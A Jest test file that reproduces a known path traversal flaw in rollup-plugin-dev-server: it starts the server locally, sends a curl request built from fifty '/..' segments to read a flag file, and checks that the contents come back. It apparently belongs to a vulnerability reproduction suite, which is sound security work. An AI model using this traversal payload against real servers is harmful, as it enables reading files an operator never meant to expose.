//https://snyk.io/vuln/SNYK-JS-ROLLUPPLUGINDEVSERVER-590124
var execSync = require("child_process").execSync;
afterAll(() => {
  try {
    execSync("fuser -k 10001/tcp");
  } catch (e) {}
});
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in rollup-plugin-dev-server", (done) => {
  const server = require("rollup-plugin-dev-server");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 10001/tcp", () => {});
  } catch (e) {}
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:10001${genstr()}"`;
  server({
    host: "localhost",
    port: 10001,
  });
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
